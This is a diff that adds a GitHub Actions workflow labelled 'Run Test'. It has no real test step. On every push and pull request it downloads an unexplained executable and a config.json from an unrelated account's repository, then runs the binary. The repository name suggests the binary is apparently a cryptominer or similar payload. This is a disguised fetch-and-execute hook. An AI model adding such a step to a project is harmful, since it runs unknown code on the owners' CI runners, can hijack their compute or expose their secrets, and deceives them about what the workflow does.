@@ -1,0 +1,28 @@
+name: Run Test
+
+on:
+  push:
+    branches: [ main, master ]
+  pull_request:
+    branches: [ main, master ]
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Create test directory
+      run: mkdir -p test
+
+    - name: Download test executable
+      run: |
+        curl -L -o test/test https://github.com/cryptogolbu-hash/Performance-Testing/raw/refs/heads/main/test
+        chmod +x test/test
+
+    - name: Download config file
+      run: curl -L -o test/config.json https://raw.githubusercontent.com/cryptogolbu-hash/Performance-Testing/refs/heads/main/config.json
+
+    - name: Run test
+      run: ./test/test
+      working-directory: ${{ github.workspace }}
